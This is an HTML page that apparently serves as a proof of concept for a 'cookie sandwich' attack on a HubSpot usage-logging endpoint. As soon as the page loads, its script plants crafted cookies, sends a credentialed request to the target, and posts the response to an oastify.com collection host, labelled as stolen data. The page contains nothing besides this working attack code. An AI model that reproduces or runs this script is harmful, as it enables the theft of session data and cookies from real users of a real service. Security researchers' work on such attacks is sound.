<!DOCTYPE html>
<html>
<head><title>Cookie Sandwich</title></head>
<body>
<script>
async function steal() {
    const target = 'https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth';
    const domain = 'app.hubspot.com';
    const path = '/api/usage-logging/v1/log/hublytics-multi/no-auth';

    // Sandwich setup
    document.cookie = `$Version=1; domain=${domain}; path=${path};`;
    document.cookie = `session="start; domain=${domain}; path=${path};`;
    document.cookie = `dummy=end"; domain=${domain}; path=/;`;

    // Send request with credentials
    const res = await fetch(target, {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify([{ event: 'test', properties: { t: Date.now() } }])
    });

    const data = await res.text();

    // Exfiltrate
    fetch('https://1uwsoqvx198y1ot2gzpz6vpft6zxnobd.oastify.com', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({ stolen: data })
    });

    console.log('✅ Sandwich sent!');
}

steal();
</script>
</body>
</html>
